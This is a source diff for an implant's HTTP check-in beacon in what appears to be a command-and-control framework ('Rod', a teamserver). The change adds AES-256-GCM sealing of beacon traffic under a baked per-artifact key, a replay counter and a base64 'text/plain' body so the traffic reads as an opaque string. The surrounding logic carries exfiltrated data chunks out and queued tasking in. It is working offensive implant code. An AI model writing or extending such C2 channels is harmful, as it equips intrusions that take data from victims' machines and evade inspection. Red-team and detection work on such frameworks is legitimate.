@@ -1,5 +1,7 @@
+using System.Buffers.Binary;
 using System.Net.Http.Headers;
 using System.Net.Security;
+using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using Google.Protobuf;
 using Rod.V1;
@@ -12,11 +14,15 @@ namespace Rod.Implant.Internal;
 // handshake frame first plus any results, exfil chunks, and staged demands
 // collected since the last cycle; the response carries the handshake
 // response, the staged chunk runs answering those demands, and queued tasking
-// while the server's dispatch budget lasts. Over https the enrolled leaf
-// rides the TLS client-certificate slot and the teamserver CA is pinned as
-// the server identity; over cleartext http the handshake's implant id is the
-// identity -- the documented anything-with-reach posture of the plain web
-// listener. The wire grammar is the envelope check-in contract
+// while the server's dispatch budget lasts. Authentication is at the
+// application layer: when the bake carried a per-artifact key, every body
+// (request and response) seals under it as AES-256-GCM ciphertext covering a
+// fresh counter, so the web transports need no TLS client certificate
+// anywhere and the cleartext-http posture carries confidential content, not
+// just authenticated content. Over https the teamserver CA is pinned as the
+// server identity and the enrolled leaf stays available for a front that
+// does ask (an mTLS front); the lab-debug bake (no key) sends the plaintext
+// framed body. The wire grammar is the envelope check-in contract
 // (extending/implants.md); nothing here is implant-only tradecraft, the same
 // frames the gRPC stream carries in a different carriage.
 
@@ -79,6 +85,18 @@ internal sealed class EnvelopeBeacon
     // when its terminal chunk arrives.
     private readonly Dictionary<string, TaskRequest> _stagedAwaiting = new();
 
+    // The per-artifact check-in seal (architecture.md Sec 8/9): the baked key
+    // split into its id and key halves, present only when the bake asked for
+    // sealed check-ins. Every body this client exchanges then rides as
+    // AES-256-GCM ciphertext under it.
+    private readonly (byte[] KeyId, byte[] Key)? _seal;
+
+    // The check-in counter: incremented before every POST attempt, so a
+    // retransmitted batch after a lost response still carries a fresh value
+    // (the server refuses a counter at or below its floor) while the batch
+    // semantics below make the retransmission itself idempotent.
+    private long _checkInCounter;
+
     public EnvelopeBeacon(
         EgressEndpoints egress,
         string implantId,
@@ -90,7 +108,8 @@ internal sealed class EnvelopeBeacon
         EnrollBundle? enroll,
         IReadOnlyList<string> classVerbs,
         TextWriter log,
-        TaskNonceTracker? nonces = null)
+        TaskNonceTracker? nonces = null,
+        TransportProfile? transport = null)
     {
         _egress = egress;
         _implantId = implantId;
@@ -107,6 +126,9 @@ internal sealed class EnvelopeBeacon
         _classVerbs = classVerbs;
         _log = log;
         _nonces = nonces ?? new TaskNonceTracker();
+        _seal = transport is { SealsCheckIns: true }
+            ? ParseBakedKey(transport.EnvelopeKey)
+            : null;
     }
 
     /// <summary>
@@ -234,12 +256,44 @@ internal sealed class EnvelopeBeacon
         var frames = new List<Frame>(1 + _upstream.Count) { HandshakeFrame() };
         frames.AddRange(_upstream);
 
-        using var content = new ByteArrayContent(EnvelopeCodec.Encode(frames));
-        content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
+        // The sealed body (the default build shape): the framed bytes behind
+        // a fresh big-endian counter, all AES-256-GCM under the baked
+        // per-artifact key. The counter burns on every attempt, not every
+        // delivery, so the retransmission above never trips the server's
+        // replay floor. The plaintext lab bake posts the frames as-is.
+        var encoded = EnvelopeCodec.Encode(frames);
+        byte[] postBody;
+        string contentType;
+        if (_seal is { } seal)
+        {
+            var plaintext = new byte[CounterBytes + encoded.Length];
+            BinaryPrimitives.WriteInt64BigEndian(plaintext, ++_checkInCounter);
+            encoded.AsSpan().CopyTo(plaintext.AsSpan(CounterBytes));
+            postBody = SealCheckInBody(plaintext, seal.KeyId, seal.Key, CheckInRequestAad);
+            contentType = "text/plain";
+        }
+        else
+        {
+            postBody = encoded;
+            contentType = "application/octet-stream";
+        }
+
+        using var content = new ByteArrayContent(postBody);
+        content.Headers.ContentType = new MediaTypeHeaderValue(contentType);
         using var response = await http.PostAsync(url, content, cancellationToken);
         response.EnsureSuccessStatusCode();
 
-        var inbound = EnvelopeCodec.Parse(await response.Content.ReadAsByteArrayAsync(cancellationToken));
+        var responseBytes = await response.Content.ReadAsByteArrayAsync(cancellationToken);
+        if (_seal is { } open)
+        {
+            // A sealed cycle answers sealed: a body that does not verify
+            // under the key this artifact carries is a dropped cycle, not a
+            // parse -- nothing inside it is acted on.
+            responseBytes = TryOpenCheckInBody(responseBytes, open.KeyId, open.Key, CheckInResponseAad)
+                ?? throw new InvalidOperationException("check-in response did not verify under the baked key");
+        }
+
+        var inbound = EnvelopeCodec.Parse(responseBytes);
         if (inbound.Count == 0)
             throw new InvalidOperationException("check-in response carried no frames");
 
@@ -458,10 +512,114 @@ internal sealed class EnvelopeBeacon
             Kind = FrameKind.TaskResult,
         };
 
+    // The sealed check-in counter's size in bytes: an 8-byte big-endian
+    // integer, the same width the teamserver's floor reads.
+    private const int CounterBytes = 8;
+
+    // The purpose tags binding each sealed body to its direction, the exact
+    // strings the teamserver's AesGcmEnvelope carries: a sealed request can
+    // never be reflected as a response and vice versa.
+    private const string CheckInRequestAad = "rod-checkin-v1";
+    private const string CheckInResponseAad = "rod-checkin-response-v1";
+
+    // Splits the baked envelope key (standard base64 of keyId(16) || key(32))
+    // into its halves, or null when malformed -- a bad bake falls back to the
+    // plaintext frame rather than checking in undecodably. Internal for the
+    // unit tests, which pin the sealed wire shape.
+    internal static (byte[] KeyId, byte[] Key)? ParseBakedKey(string baked)
+    {
+        if (baked.Length == 0)
+            return null;
+        byte[] packed;
+        try
+        {
+            packed = Convert.FromBase64String(baked);
+        }
+        catch (FormatException)
+        {
+            return null;
+        }
+        if (packed.Length != 16 + 32)
+            return null;
+        return (packed[..16], packed[16..]);
+    }
+
+    // The sealed check-in wire shape, the teamserver's AesGcmEnvelope
+    // contract reimplemented verbatim: base64 of
+    // b"R1" || keyId(16) || nonce(12) || ciphertext || tag(16), returned as
+    // the body bytes to POST (base64 text -- the body reads as an opaque
+    // string, not a structured binary). Internal for the unit tests, which
+    // pin the sealed wire shape.
+    internal static byte[] SealCheckInBody(ReadOnlySpan<byte> plaintext, byte[] keyId, byte[] key, string aad)
+    {
+        var nonce = RandomNumberGenerator.GetBytes(12);
+        var ciphertext = new byte[plaintext.Length];
+        var tag = new byte[16];
+        using (var aes = new AesGcm(key, 16))
+        {
+            aes.Encrypt(nonce, plaintext, ciphertext, tag, System.Text.Encoding.UTF8.GetBytes(aad));
+        }
+
+        var body = new byte[2 + 16 + 12 + ciphertext.Length + 16];
+        var position = 0;
+        "R1"u8.CopyTo(body.AsSpan(position));
+        position += 2;
+        keyId.AsSpan().CopyTo(body.AsSpan(position));
+        position += 16;
+        nonce.AsSpan().CopyTo(body.AsSpan(position));
+        position += 12;
+        ciphertext.AsSpan().CopyTo(body.AsSpan(position));
+        position += ciphertext.Length;
+        tag.AsSpan().CopyTo(body.AsSpan(position));
+        return System.Text.Encoding.UTF8.GetBytes(Convert.ToBase64String(body));
+    }
+
+    // Opens what SealCheckInBody sealed under the same key id and purpose
+    // tag: authenticates the GCM tag and returns the plaintext, or null on
+    // any mismatch (wrong key, tampered bytes, foreign shape) -- the caller
+    // drops the whole cycle rather than acting on a partial read. Internal
+    // for the unit tests, which pin the sealed wire shape.
+    internal static byte[]? TryOpenCheckInBody(byte[] body, byte[] keyId, byte[] key, string aad)
+    {
+        string text;
+        byte[] packed;
+        try
+        {
+            text = System.Text.Encoding.UTF8.GetString(body).Trim();
+            packed = Convert.FromBase64String(text);
+        }
+        catch (Exception ex) when (ex is FormatException or System.Text.DecoderFallbackException)
+        {
+            return null;
+        }
+        if (packed.Length < 2 + 16 + 12 + 16)
+            return null;
+        if (!packed.AsSpan(0, 2).SequenceEqual("R1"u8))
+            return null;
+        if (!packed.AsSpan(2, 16).SequenceEqual(keyId))
+            return null;
+        var nonce = packed.AsSpan(2 + 16, 12).ToArray();
+        var ciphertextLength = packed.Length - 2 - 16 - 12 - 16;
+        var ciphertext = packed.AsSpan(2 + 16 + 12, ciphertextLength).ToArray();
+        var tag = packed.AsSpan(packed.Length - 16).ToArray();
+        var plaintext = new byte[ciphertextLength];
+        try
+        {
+            using var aes = new AesGcm(key, 16);
+            aes.Decrypt(nonce, ciphertext, tag, plaintext, System.Text.Encoding.UTF8.GetBytes(aad));
+        }
+        catch (CryptographicException)
+        {
+            return null;
+        }
+        return plaintext;
+    }
+
     // One client per cycle, mirroring the gRPC beacon's per-cycle channel:
-    // the walk's current entry decides the shape -- https presents the
-    // enrolled leaf and pins the teamserver CA as the server identity (the
-    // check-in routes demand the certificate over TLS), http is the bare
+    // the walk's current entry decides the shape -- https pins the teamserver
+    // CA as the server identity and keeps the enrolled leaf available for a
+    // front that asks to see one (an mTLS front; a web https front never
+    // asks, and the sealed body is the identity), http is the bare
     // cleartext client the plain web posture documents.
     private HttpClient BuildClient(string url)
     {
